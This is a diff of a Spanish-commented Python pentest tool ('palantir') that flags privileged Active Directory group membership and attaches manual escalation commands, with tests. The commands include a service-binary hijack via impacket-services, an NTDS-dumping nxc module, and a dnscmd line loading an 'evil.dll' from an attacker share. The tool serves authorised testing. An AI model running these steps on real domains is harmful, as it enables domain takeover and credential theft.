@@ -8208,44 +8208,113 @@ def _creds_enum(res, nxc, np, ip, u, secret, is_hash, local_auth, is_dc, port, d
             # existe en el dominio raíz del bosque: en un dominio hijo nxc dice 'not found' y
             # _parse_nxc_group_members lo descarta (sin ruido).
             if is_dc:
-                for grp in ("Domain Admins", "Enterprise Admins", "Backup Operators"):
+                # Grupos privilegiados con una vía de privesc CONOCIDA cuando la credencial
+                # APORTADA está entre sus miembros (operator-asked: "toda detección posible que
+                # la haga palantir"). nxc solo marca Pwn3d!/admin_privs por SMB con grupo local
+                # Administrators o equivalente — ninguno de estos lo es, así que sin este chequeo
+                # explícito la vía pasaba inadvertida pese a ser tan directa como un Pwn3d!. Cada
+                # uno con su propia plantilla de next-step (_attach_cmd: para que Quick Wins
+                # enseñe SIEMPRE el comando correcto de ESTE hallazgo, nunca uno heurístico de
+                # otro — mismo bug real que el de SMBGhost, corregido aquí desde el principio en
+                # vez de repetirlo). 'Backup Operators'/'Server Operators' SÍ tienen un comando
+                # real y verificado que ejecutar a mano; 'Print Operators'/'DnsAdmins' NO tienen
+                # un one-liner de Linux fiable (dependen de dnscmd.exe/RSAT o de cargar un driver
+                # firmado vulnerable) — se avisa de la vía real sin inventar un comando que no
+                # existe.
+                for grp in ("Domain Admins", "Enterprise Admins", "Backup Operators",
+                            "Server Operators", "Print Operators", "DnsAdmins"):
                     rc, out = _run_capture_retry([nxc, "ldap", ip] + A() + ["--groups", grp], timeout=90, quiet=True)
                     members = _parse_nxc_group_members(out)
                     _step(res, f'{nxc} ldap {ip} {shown_auth} --groups {shlex.quote(grp)}', bool(members), mask(out),
                           note=f"miembros del grupo '{grp}' (quién controla el dominio) — solo lectura")
-                    if members:
-                        _add_once(res, "alta",
-                                  f"AD (cred {u}): '{grp}' — {len(members)} miembro(s): "
-                                  + ", ".join(members[:15]) + (" …" if len(members) > 15 else ""),
-                                  f"miembros {grp}", seen)
-                        # Backup Operators + SeBackupPrivilege (operator-asked: "¿este módulo cuenta
-                        # como auto-explotación? para ver si es OSCP-safe"): si la credencial APORTADA
-                        # está entre los miembros, hay una vía de privesc tan directa como un Pwn3d!
-                        # pero por un camino DISTINTO — nxc NO la marca Pwn3d!/admin_privs por esto
-                        # (eso exige grupo local Administrators o equivalente), así que sin este
-                        # chequeo pasaba inadvertida. El módulo 'backup_operator' de nxc (mpgn_x64,
+                    if not members:
+                        continue
+                    _add_once(res, "alta",
+                              f"AD (cred {u}): '{grp}' — {len(members)} miembro(s): "
+                              + ", ".join(members[:15]) + (" …" if len(members) > 15 else ""),
+                              f"miembros {grp}", seen)
+                    if not any(m.lower() == u.lower() for m in members):
+                        continue
+                    _sec_url = secret if SHOW_SECRETS else "***"
+                    if grp == "Backup Operators":
+                        # SeBackupPrivilege: el módulo 'backup_operator' de nxc (mpgn_x64,
                         # netexec/nxc/modules/backup_operator.py — confirmado leyendo su código
-                        # fuente real) SÍ la explota solo: dispara RemoteRegistry, vuelca
+                        # fuente real) explota esto SOLO: dispara RemoteRegistry, vuelca
                         # SAM/SECURITY/SYSTEM a SYSVOL y ADEMÁS intenta pass-the-hash automático +
-                        # NTDS dump COMPLETO contra el DC — es explotación activa de verdad (no un
-                        # check de solo lectura como smbghost/zerologon), así que SÍ cuenta como
-                        # auto-explotación y NO es OSCP-safe lanzarlo solo: palantir NUNCA lo
-                        # ejecuta, se deja como next-step MANUAL (mismo trato que
+                        # NTDS dump COMPLETO contra el DC — explotación activa de verdad (no un
+                        # check de solo lectura como smbghost/zerologon: operator-asked, "¿esto
+                        # cuenta como auto-explotación? para ver si es OSCP-safe" — sí cuenta),
+                        # así que palantir NUNCA lo ejecuta: next-step MANUAL (mismo trato que
                         # cve-2020-1472-exploit.py para Zerologon).
-                        if grp == "Backup Operators" and any(m.lower() == u.lower() for m in members):
-                            _add_once(res, "critica",
-                                      f"AD (cred {u}): la credencial aportada es MIEMBRO de 'Backup Operators' — "
-                                      "SeBackupPrivilege permite volcar SAM/SECURITY/SYSTEM remotos sin ser admin "
-                                      "de dominio (nxc no lo marca Pwn3d! por esto, pero es una vía de privesc "
-                                      "tan directa como esa)",
-                                      f"backup_operator {u}", seen)
+                        _bo_txt = (f"AD (cred {u}): la credencial aportada es MIEMBRO de 'Backup Operators' — "
+                                   "SeBackupPrivilege permite volcar SAM/SECURITY/SYSTEM remotos sin ser admin "
+                                   "de dominio (nxc no lo marca Pwn3d! por esto, pero es una vía de privesc "
+                                   "tan directa como esa)")
+                        if _add_once(res, "critica", _bo_txt, f"backup_operator {u}", seen):
                             _bo_shown_sec = ("-H " if is_hash else "-p ") + _sec_disp(secret)
+                            _attach_cmd(res, _bo_txt, [
+                                f"nxc smb {ip} -u {shlex.quote(u)} {_bo_shown_sec} -M backup_operator   # vuelca "
+                                "SAM/SECURITY/SYSTEM Y ADEMÁS intenta pass-the-hash automático + NTDS dump COMPLETO "
+                                "contra el DC (deja ficheros temporales en SYSVOL, el propio módulo intenta "
+                                "borrarlos al final) — paso ACTIVO de alto impacto, palantir nunca lo encadena solo"])
+                    elif grp == "Server Operators":
+                        # ACL por defecto de HKLM\SYSTEM\CurrentControlSet\Services\* da a Server
+                        # Operators control sobre el binario de un servicio YA EXISTENTE (no
+                        # necesita poder crear uno nuevo): reconfigúralo para que apunte a un
+                        # binario propio y arráncalo → ejecución como SYSTEM (el servicio corre
+                        # como LocalSystem por defecto). impacket-services (examples/services.py,
+                        # acciones 'config'/'change'/'start' — confirmado leyendo su código fuente
+                        # real) es el equivalente Linux de sc.exe/reg.exe para esto. Paso ACTIVO y
+                        # DESTRUCTIVO (sobrescribe la configuración de un servicio real): por eso
+                        # el primer next-step es volcar la config ORIGINAL antes de tocar nada, y
+                        # el texto deja claro que hay que restaurarla después con el mismo 'change'.
+                        _so_txt = (f"AD (cred {u}): la credencial aportada es MIEMBRO de 'Server Operators' — "
+                                   "ACL por defecto sobre HKLM\\SYSTEM\\CurrentControlSet\\Services\\* permite "
+                                   "reconfigurar el binario de un servicio EXISTENTE y arrancarlo como SYSTEM")
+                        if _add_once(res, "critica", _so_txt, f"server_operators {u}", seen):
+                            _so_auth = (f"-hashes :{_sec_url} {domain or 'DOMINIO'}/{shlex.quote(u)}@{ip}" if is_hash
+                                        else f"{domain or 'DOMINIO'}/{shlex.quote(u)}:{_sec_url}@{ip}")
+                            _attach_cmd(res, _so_txt, [
+                                f"impacket-services {_so_auth} config -name <SERVICIO_EXISTENTE>   # 1º: ANOTA la "
+                                "configuración ORIGINAL (-path) antes de tocar nada, para poder restaurarla después",
+                                f"impacket-services {_so_auth} change -name <SERVICIO_EXISTENTE> -path '<TU_BINARIO_O_PAYLOAD>'   "
+                                "# 2º: reconfigura el binario (paso ACTIVO y DESTRUCTIVO — elige un servicio que no "
+                                "se note / puedas restaurar; palantir nunca ejecuta esto solo ni decide el payload)",
+                                f"impacket-services {_so_auth} start -name <SERVICIO_EXISTENTE>   # 3º: lo arranca "
+                                "como SYSTEM (puede 'fallar' a ojos de Windows, el comando ya corrió igual)",
+                                f"impacket-services {_so_auth} change -name <SERVICIO_EXISTENTE> -path '<PATH_ORIGINAL_DEL_PASO_1>'   "
+                                "# 4º: RESTAURA el binario original — no dejes el servicio reconfigurado"])
+                    elif grp == "Print Operators":
+                        # SeLoadDriverPrivilege (cargar/descargar drivers de kernel): la vía real
+                        # es cargar un driver firmado pero vulnerable (p. ej. Capcom.sys) para
+                        # ejecución en modo kernel — sin un one-liner de Linux fiable: hace falta
+                        # YA tener una sesión interactiva en el equipo (evil-winrm/RDP) para
+                        # 'sc create'+cargar el driver y disparar el exploit del lado de kernel.
+                        # No se inventa aquí un comando que no existe — se deja la vía MANUAL,
+                        # con el nombre de la técnica real para que el operador la busque.
+                        _po_txt = (f"AD (cred {u}): la credencial aportada es MIEMBRO de 'Print Operators' — "
+                                   "SeLoadDriverPrivilege permite cargar un driver de kernel (firmado pero "
+                                   "vulnerable, p. ej. Capcom.sys) para ejecución en modo kernel como SYSTEM")
+                        if _add_once(res, "critica", _po_txt, f"print_operators {u}", seen):
                             res["next"].append(
-                                f"nxc smb {ip} -u {shlex.quote(u)} {_bo_shown_sec} -M backup_operator   # confirmado "
-                                "MIEMBRO de 'Backup Operators' arriba — vuelca SAM/SECURITY/SYSTEM Y ADEMÁS intenta "
-                                "pass-the-hash automático + NTDS dump COMPLETO contra el DC (deja ficheros "
-                                "temporales en SYSVOL, el propio módulo intenta borrarlos al final) — paso ACTIVO "
-                                "de alto impacto, palantir nunca lo encadena solo")
+                                f"evil-winrm -i {ip} -u {shlex.quote(u)} {'-H ' + _sec_disp(secret, True) if is_hash else '-p ' + _sec_disp(secret)}   "
+                                "# PRIMER paso MANUAL: con sesión interactiva, carga un driver vulnerable firmado "
+                                "(técnica 'SeLoadDriverPrivilege / vulnerable driver loading', p. ej. Capcom.sys) — "
+                                "sin un comando de Linux de un solo paso para esto, busca la técnica por su nombre")
+                    elif grp == "DnsAdmins":
+                        # ServerLevelPluginDll: apunta el servicio DNS (corre como SYSTEM en el
+                        # DC) a una DLL propia y reinícialo. Requiere dnscmd.exe (RSAT, lado
+                        # Windows) — no hay equivalente Linux de un solo comando (confirmado: ni
+                        # nxc ni impacket traen esto). Se deja la vía MANUAL con los pasos reales.
+                        _da_txt = (f"AD (cred {u}): la credencial aportada es MIEMBRO de 'DnsAdmins' — puede "
+                                   "apuntar el servicio DNS del DC (corre como SYSTEM) a una DLL propia vía "
+                                   "'ServerLevelPluginDll' y reiniciarlo para ejecución como SYSTEM")
+                        if _add_once(res, "critica", _da_txt, f"dnsadmins {u}", seen):
+                            res["next"].append(
+                                f"evil-winrm -i {ip} -u {shlex.quote(u)} {'-H ' + _sec_disp(secret, True) if is_hash else '-p ' + _sec_disp(secret)}   "
+                                "# PRIMER paso MANUAL: con sesión interactiva (o RSAT), 'dnscmd <DC> /config "
+                                "/serverlevelplugindll \\\\TU_IP\\share\\evil.dll' y reinicia el servicio DNS (sc "
+                                "stop/start dns) — sin equivalente Linux de un solo comando, dnscmd.exe es de RSAT")
                 # MachineAccountQuota: ¿cuántas cuentas de equipo puede unir al dominio ESTA
                 # cuenta (o cualquier otra, ya que es el valor del atributo del dominio, no por
                 # usuario)? MAQ>0 es la precondición de noPac/RBCD/Shadow Credentials — todos
@@ -13292,6 +13361,59 @@ def selftest():
     assert not any("MIEMBRO de 'Backup Operators'" in t for _s, t in _ceres_bkop2["findings"]), _ceres_bkop2["findings"]
     assert not any("backup_operator" in n for n in _ceres_bkop2["next"]), _ceres_bkop2["next"]
     assert any(s == "alta" and "'Backup Operators' — 1 miembro(s): otrousuario" in t for s, t in _ceres_bkop2["findings"])
+
+    # Server Operators: control por defecto sobre HKLM\SYSTEM\CurrentControlSet\Services\* →
+    # reconfigurar un servicio existente y arrancarlo como SYSTEM (impacket-services, nunca
+    # ejecutado por palantir — ver _attach_cmd: Quick Wins debe usar ESTE comando, no uno ajeno).
+    def _fake_ce_srvop(cmd, timeout=None, quiet=False, **kw):
+        if cmd[0] == "ldapsearch":
+            return 0, ""
+        if "-M" in cmd and "maq" in cmd:
+            return 0, "MachineAccountQuota: 10"
+        if "--groups" in cmd and cmd[-1] == "Server Operators":
+            return 0, "LDAP 10.0.0.1 389 DC01 svc_backup"
+        return 0, "LDAP 10.0.0.1 389 DC01 [*] ok"
+    globals()["run_capture"] = _fake_ce_srvop
+    _ceres_srvop = _fp("reuse-ldap", "x", [389])
+    try:
+        _creds_enum(_ceres_srvop, "FAKE_NXC", "ldap", "10.0.0.1", "svc_backup", "Welcome1", False, False, True,
+                   389, 389, None, domain="inlanefreight.local")
+    finally:
+        globals()["run_capture"] = _real_rc_ce
+    assert any(s == "critica" and "MIEMBRO de 'Server Operators'" in t and "svc_backup" in t
+               for s, t in _ceres_srvop["findings"]), _ceres_srvop["findings"]
+    assert any("impacket-services" in n and "config -name <SERVICIO_EXISTENTE>" in n for n in _ceres_srvop["next"]), _ceres_srvop["next"]
+    assert any("change -name <SERVICIO_EXISTENTE>" in n for n in _ceres_srvop["next"]), _ceres_srvop["next"]
+    assert any("start -name <SERVICIO_EXISTENTE>" in n for n in _ceres_srvop["next"]), _ceres_srvop["next"]
+    _srvop_cmdfor = _ceres_srvop.get("_cmd_for", {})
+    _srvop_key = next(t for t in _srvop_cmdfor if "Server Operators" in t)
+    assert len(_srvop_cmdfor[_srvop_key]) == 4, _srvop_cmdfor[_srvop_key]   # config/change/start/restaurar
+
+    # Print Operators / DnsAdmins: sin un comando de Linux de un solo paso real (SeLoadDriverPrivilege
+    # y dnscmd.exe respectivamente) — se avisa de la vía real, sin inventar un comando que no existe.
+    def _fake_ce_po_da(cmd, timeout=None, quiet=False, **kw):
+        if cmd[0] == "ldapsearch":
+            return 0, ""
+        if "-M" in cmd and "maq" in cmd:
+            return 0, "MachineAccountQuota: 10"
+        if "--groups" in cmd and cmd[-1] == "Print Operators":
+            return 0, "LDAP 10.0.0.1 389 DC01 jon"
+        if "--groups" in cmd and cmd[-1] == "DnsAdmins":
+            return 0, "LDAP 10.0.0.1 389 DC01 jon"
+        return 0, "LDAP 10.0.0.1 389 DC01 [*] ok"
+    globals()["run_capture"] = _fake_ce_po_da
+    _ceres_po_da = _fp("reuse-ldap", "x", [389])
+    try:
+        _creds_enum(_ceres_po_da, "FAKE_NXC", "ldap", "10.0.0.1", "jon", "Welcome1", False, False, True,
+                   389, 389, None, domain="inlanefreight.local")
+    finally:
+        globals()["run_capture"] = _real_rc_ce
+    assert any(s == "critica" and "MIEMBRO de 'Print Operators'" in t and "SeLoadDriverPrivilege" in t
+               for s, t in _ceres_po_da["findings"]), _ceres_po_da["findings"]
+    assert any(s == "critica" and "MIEMBRO de 'DnsAdmins'" in t and "ServerLevelPluginDll" in t
+               for s, t in _ceres_po_da["findings"]), _ceres_po_da["findings"]
+    assert any("evil-winrm -i 10.0.0.1 -u jon -p Welcome1" in n and "SeLoadDriverPrivilege" in n for n in _ceres_po_da["next"]), _ceres_po_da["next"]
+    assert any("dnscmd" in n and "serverlevelplugindll" in n for n in _ceres_po_da["next"]), _ceres_po_da["next"]
 
     # LDAP primero (_CREDS_PROTO_PRIORITY la pone antes que SMB): si YA sacó la lista COMPLETA
     # de usuarios del dominio, SMB se la ahorra (--users/--rid-brute, mucho más lentos contra un
